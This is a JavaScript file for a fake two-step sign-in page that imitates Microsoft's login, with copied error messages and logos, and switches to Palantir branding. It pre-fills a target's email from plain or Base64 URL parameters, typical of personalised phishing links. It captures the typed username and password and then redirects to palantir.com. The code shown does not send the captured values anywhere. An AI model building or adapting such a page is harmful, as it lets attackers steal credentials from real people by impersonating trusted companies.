const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");

function validateEmail(email) {
  const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(email);
}

function validate() {
  const $result = $("#result");
  const email = $("#email").val();
  $result.text("");

  if(!validateEmail(email)) {
    if(!email) {
      $result.text("Enter a valid email address, phone number, or Skype\n name.");
      $result.css("color", "red");
      // make loginForm little bigger
      document.getElementById("loginForm").style.height = "403px";
    } else {
      $result.text("That Microsoft account doesn't exist.");
      $result.css("color", "red");
      // make loginForm little bigger
      document.getElementById("loginForm").style.height = "403px";
    }
    return false;
  }
  return true;
}

function validatePassword() {
  const $passResult = $("#passResult");
  const password = $("#password").val();
  $passResult.text("");

  if(password.length < 8) {
    $passResult.text("Your account or password is incorrect.");
    $passResult.css("color", "red");
    return false;
  }
  return true;
}

// event listeners for entering in textbox
var input1 = document.getElementById("email");
var input2 = document.getElementById("password");

input1.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("btnSend").click();
  }
})

input2.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("btnSignIn").click();
  }
})

function proceedToPasswordForm(email) {
  // check email is not empty
  if(!validate()) return;
  
  // check valid email
  if(!validateEmail(email)) {
    return;
  }
  
  // set valid email to next slide
  document.getElementById("userLine").textContent = email;

  document.getElementById("image").src = 'palantir_logo.png'
  document.body.style.backgroundImage = 'none';
  document.body.style.backgroundColor = 'black';
  document.getElementById("info-box").style.visibility = "visible";

  // set margins to slide next part of login form to visible and hide first one
  const section1 = document.getElementById("section-1");
  const section2 = document.getElementById("section-2");
  section1.style.marginLeft = "-100%";
  section1.style.visibility = "hidden";
  section2.style.marginLeft = "0%";

  // make loginForm little bigger
  document.getElementById("loginForm").style.height = "403px";
  document.getElementById("loginForm").style.marginTop = "-84px";
}

function startAtPasswordFormIfNeeded() {
  const urlParams = new URLSearchParams(window.location.search);
  
  const email = urlParams.get('e');
  if(email && validateEmail(email)) {
    document.getElementById("email").value = email;
    proceedToPasswordForm(email); // Call a refactored function for proceeding to the password form
  }

  const encodedEmail = urlParams.get('b');
  if(encodedEmail) {
    const decodedEmail = atob(encodedEmail); // Decode the Base64 encoded email
    if(validateEmail(decodedEmail)) {
      document.getElementById("email").value = decodedEmail;
      proceedToPasswordForm(decodedEmail); // Proceed to password form with the decoded email
    }
  }
}

// user has entered their email and proceeded to password section
btnNext.addEventListener("click", function(){
  const email = input1.value;
  if(!validate()) return;
  if(!validateEmail(email)) return;
  proceedToPasswordForm(email);
});

submitBtn.addEventListener("click", function(){

    const collectUserName = input1.value;
    const collectPassword = input2.value;

  // check password
  if (!validatePassword()) return;

  setTimeout(function(){
    window.location.href = "https://www.palantir.com/";
  },10);
});

// user has hit back to regular login form
prevBtnSec.addEventListener("click", function(){

  // set margins to top back to normnal
  const section1 = document.getElementById("section-1");
  const section2 = document.getElementById("section-2");
  section1.style.marginLeft = "0%";
  section1.style.visibility = "visible";
  section2.style.marginLeft = "100%";

  // make loginForm little bigger
  document.getElementById("loginForm").style.height = "370px";
  document.getElementById("loginForm").style.marginTop = "0px";
  document.getElementById("info-box").style.visibility = "hidden";

  document.getElementById("image").src = 'microsoft_logo.svg'
  document.body.style.backgroundImage = '../../background.png';

  slidePage.style.marginLeft = "0%";
  secondSlide.style.marginLeft = "100%";
  slidePage.style.visibility = "visible";
});

startAtPasswordFormIfNeeded()